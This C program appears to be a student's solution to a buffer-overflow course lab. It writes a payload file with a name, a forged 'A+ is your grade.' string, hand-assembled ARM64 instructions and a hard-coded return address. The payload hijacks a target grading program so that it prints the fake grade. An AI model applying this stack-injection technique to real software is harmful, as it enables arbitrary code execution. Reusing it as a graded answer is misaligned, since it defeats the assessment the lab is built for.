#include <stdio.h>
#include "miniassembler.h"

int main(void) {

    int i; 
    unsigned long ulAddr;
    unsigned int uiAdr;
    unsigned int uiBl;
    unsigned int uiB; 
    
    FILE *psFile;
    psFile = fopen("dataAplus", "w");

    /* Write name to file */
    fprintf(psFile, "Chewei Puaji");
    putc('\0', psFile);

    /* Write gradeStr to file */
    fprintf(psFile, "A+ is your grade.");

    for (i = 0; i < 2; i++) {
        putc('\0', psFile);
    } 

    /*  addr x0, &gradeStr */    
    uiAdr = MiniAssembler_adr(0, 0x420065, 0x420078);
    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);

    /* bl x0 */
    uiBl = MiniAssembler_bl(0x40086c, 0x42007C);
    fwrite(&uiBl, sizeof(unsigned int), 1, psFile); 

    /* b printf */
    uiB = MiniAssembler_b(0x400878, 0x420080); 
    fwrite(&uiB, sizeof(unsigned int), 1, psFile);

    /* Fill in null bytes to reach the end of buf array */
    for (i = 0; i < 4; i++) {
        putc('\0', psFile);
    }

    /* Write the return address */ 
    ulAddr = 0x420078;
    fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);

    /* Close the file and return 0 */
    fclose(psFile); 
    return 0; 

}